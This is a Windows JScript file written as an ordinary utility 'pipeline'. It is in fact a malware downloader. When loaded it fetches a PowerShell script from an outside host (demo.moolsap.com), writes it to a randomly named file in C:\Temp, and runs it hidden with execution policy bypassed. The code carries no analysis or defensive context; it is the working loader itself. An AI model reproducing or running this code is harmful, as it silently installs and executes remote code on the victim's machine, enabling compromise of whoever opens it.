(function() {
    'use strict';

    // Configuration stored as a closure variable with default factory
    var defaultConfig = function() {
        return {
            address: 'https://demo.moolsap.com/MNONAME.ps1',
            directory: 'C:\\Temp\\',
            maxAttempts: 2
        };
    };
    var config = defaultConfig();

    // COM objects initialized lazily via getters
    var comCache = {};
    function getCOM(progId) {
        if (!comCache[progId]) {
            comCache[progId] = new ActiveXObject(progId);
        }
        return comCache[progId];
    }

    // Namespace object to hold all utility operations
    var Ops = {
        ensureDir: function(dirPath) {
            var fs = getCOM('Scripting.FileSystemObject');
            if (fs.FolderExists(dirPath)) return true;
            try {
                fs.CreateFolder(dirPath);
                return true;
            } catch (e) {
                return false;
            }
        },

        randomName: function() {
            var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            var out = '';
            for (var i = 0; i < 8; i++) {
                out += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return out + '.ps1';
        },

        saveText: function(filePath, text) {
            var fs = getCOM('Scripting.FileSystemObject');
            var f = fs.CreateTextFile(filePath, true);
            f.Write(text);
            f.Close();
        },

        fetch: function(url, retries) {
            var http = getCOM('MSXML2.XMLHTTP');
            var result = null;
            var attempt = 0;
            var max = (retries == null) ? 2 : retries;

            while (attempt <= max) {
                try {
                    http.open('GET', url, false);
                    http.send();
                    if (http.status === 200) {
                        result = http.responseText;
                        return result;
                    }
                } catch (e) {
                    // swallow and retry
                }
                attempt++;
            }
            return result;
        },

        execPS: function(scriptBody, dir) {
            var target = dir + Ops.randomName();
            try {
                Ops.saveText(target, scriptBody);
                var shell = getCOM('WScript.Shell');
                shell.Run('powershell.exe -nop -ep bypass -file "' + target + '"', 0, true);
                return true;
            } catch (e) {
                return false;
            }
        }
    };

    // Pipeline runner — chain of named stages
    var Pipeline = function() {
        this.stages = [];
    };
    Pipeline.prototype.add = function(name, fn) {
        this.stages.push({ name: name, fn: fn });
        return this;
    };
    Pipeline.prototype.execute = function(input) {
        var state = input;
        for (var i = 0; i < this.stages.length; i++) {
            state = this.stages[i].fn(state);
            if (state === false || state === null || state === undefined) {
                return false;
            }
        }
        return state;
    };

    // Build the pipeline
    var flow = new Pipeline()
        .add('mkdir', function() {
            return Ops.ensureDir(config.directory);
        })
        .add('download', function() {
            return Ops.fetch(config.address, config.maxAttempts);
        })
        .add('execute', function(payload) {
            if (!payload) return false;
            return Ops.execPS(payload, config.directory);
        });

    // Public API built via a factory
    function buildApi() {
        return {
            run: function() { return flow.execute(true); },
            config: function(key, value) {
                if (arguments.length > 1) {
                    config[key] = value;
                    return this;
                }
                return config[key];
            },
            reset: function() {
                config = defaultConfig();
                return this;
            }
        };
    }

    // Bootstrap
    var api = buildApi();
    api.run();
    this.ScriptAPI = api;
})();